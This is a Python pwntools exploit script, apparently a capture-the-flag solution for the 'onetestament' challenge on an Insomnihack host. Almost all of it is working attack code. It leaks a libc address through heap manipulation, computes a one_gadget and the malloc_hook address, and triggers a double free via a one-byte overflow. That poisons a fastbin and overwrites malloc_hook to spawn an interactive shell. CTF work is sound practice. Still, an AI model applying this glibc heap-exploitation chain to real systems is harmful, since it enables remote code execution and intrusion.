from pwn import *

def add(io, test_type, content):
    io.sendline(b"1")
    io.sendafter(b":", test_type)
    io.sendafter(b":", content)
    io.recvuntil(b"Please enter your choice: ")

def delete(io, index):
    io.sendline(b"4")
    io.sendafter(b":", index + b"\n")
    io.recvuntil(b"Please enter your choice: ")

def edit(io, index, content):
    io.sendline(b"3")
    io.sendafter(b":", index)
    io.sendafter(b":", content)
    io.recvuntil(b"Please enter your choice: ")

#io = process("./ontestament.bin_patched")
io = remote('onetestament.insomnihack.ch', 6666)
io.recvuntil(b': ')

# raw_input('attach gdb')

########
# Leak #
########.

# create big chunk
add(io, b"4\n", b"AAAAAAAA\n")
# create small chunk
add(io, b"1\n", b"BBBBBBB\n")
# free big chunk into unsorted bin
delete(io, b"0")

# create small chunk, shrinks the unsorted bin
add(io, b"1\n", b"CCCC\n")

# increment metadata
edit(io, b"0\n", b"24\n") 
edit(io, b"0\n", b"24\n") 

# leeeaaaaaakkkk
io.sendline(b"1")
io.sendafter(b":", b"3\n")
io.sendafter(b":", b"\n")
io.recvuntil(b"My new testament:")
leak = io.recvuntil(b"=").replace(b"=", b"").strip()
leak = b"\x00" + leak
leak += b"\x00" * (8 - len(leak))

log.success(f"libc leak: 0x{u64(leak):08x}")

###################
# Compute offsets #
###################

libc_base = u64(leak) - 0x7f34a5341b00 + 0x00007f34a4f7d000
log.info(f"libc base: 0x{libc_base:08x}")
one_gadget = 0x4527a + libc_base
log.info(f"one_gadget: 0x{one_gadget:08x}")

malloc_hook = 0x003C4B10 + libc_base
log.info(f"malloc_hook: 0x{malloc_hook:08x}")
log.info(f"malloc_hook - 0x23: 0x{malloc_hook-0x23:08x}")

###############
# Double free #
###############

io.recvuntil(b': ')

input("attach")

#io.recvuntil(b":")
add(io, b"3\n", b"DDDD\n")
add(io, b"3\n", b"EEEE\n")
delete(io, b"4")
delete(io, b"5")

#trigger one-byte overflow
io.send(b"12345\n")

io.recvuntil(b"Please enter your choice:")

# trigger double free
delete(io, b"4")

# store arbitrary address to be allocated
add(io, b"3\n", p64(malloc_hook-0x23) + b"\n")

# empty fastbins
add(io, b"3\n", b"GGGG\n")
add(io, b"3\n", b"HHHH\n")

# alloc pointing to malloc_hook
add(io, b"3\n", b"\x00" * 0x13 + p64(one_gadget) + b"\n")

# trigger one_gadget
add(io, b"3\n", "lololol\n")

io.interactive()


